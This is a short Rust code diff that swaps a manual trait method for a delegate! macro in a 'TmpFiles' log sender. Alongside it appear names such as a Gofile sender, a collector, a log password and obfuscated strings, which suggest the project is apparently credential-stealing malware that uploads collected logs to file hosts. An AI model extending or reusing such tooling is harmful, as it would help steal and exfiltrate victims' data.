@@ -3,6 +3,7 @@ use crate::gofile::GofileSender;
 use crate::{LogContent, LogFile, LogSender, SendError};
 use alloc::string::String;
 use collector::Collector;
+use delegate::delegate;
 use derive_new::new;
 use json::parse;
 use obfstr::obfstr as s;
@@ -40,16 +41,10 @@ fn upload(name: &str, bytes: &[u8]) -> Option<String> {
 }
 
 impl<T: LogSender> LogSender for TmpFiles<T> {
-    fn send<P, C>(
-        &self,
-        log_file: LogFile,
-        password: Option<P>,
-        collector: &C,
-    ) -> Result<(), SendError>
-    where
-        P: AsRef<str> + Clone,
-        C: Collector,
-    {
-        self.inner.send(log_file, password, collector)
+    delegate! {
+        to self.inner {
+            fn send<P, C>(&self, log_file: LogFile, password: Option<P>, collector: &C) -> Result<(), SendError>
+            where P: AsRef<str> + Clone, C: Collector;
+        }
     }
 }
